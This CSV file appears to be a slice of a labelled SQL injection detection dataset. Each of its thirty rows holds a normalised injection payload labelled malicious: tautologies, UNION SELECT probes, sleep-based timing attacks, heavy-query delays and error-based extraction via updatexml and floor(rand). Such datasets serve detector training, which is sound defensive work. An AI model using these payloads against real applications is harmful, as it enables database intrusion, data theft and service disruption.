row_index,payload_norm,label,sqli_type_hint
6000,"-9820"" or 1038 = 7502#",1,
6001,"1 ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 9462 = 9462",1,
6002,"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",1,
6003,"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",1,
6004,"1%' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",1,
6005,-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,1,
6006,"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",1,
6007,"1%"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6008,"-2840' ) ) ) union all select 3025,3025,3025,3025--",1,
6009,select case when 5346 = 8272 then 1 else null end--,1,
6010,"select sleep ( 5 ) and ""oivc"" like ""oivc",1,
6011,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
6012,1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,1,
6013,"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",1,
6014,"1'|| ( select 'skds' from dual where 8594 = 8594 and make_set ( 6779 = 2027,2027 ) ) ||'",1,
6015,"1%' union all select null,null--",1,
6016,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
6017,1' ) as imgv where 7802 = 7802,1,
6018,1'+ ( select 'vidl' where 9445 = 9445 and 5498 = 5777#,1,
6019,"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277",1,
6020,"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",1,
6021,"1%' union all select null,null,null,null,null,null--",1,
6022,"-4072%"" ) ) ) or 3999 = 1979",1,
6023,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",1,
6024,"1"" and sleep ( 5 ) #",1,
6025,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",1,
6026,"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",1,
6027,"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
6028,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",1,
6029,"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,
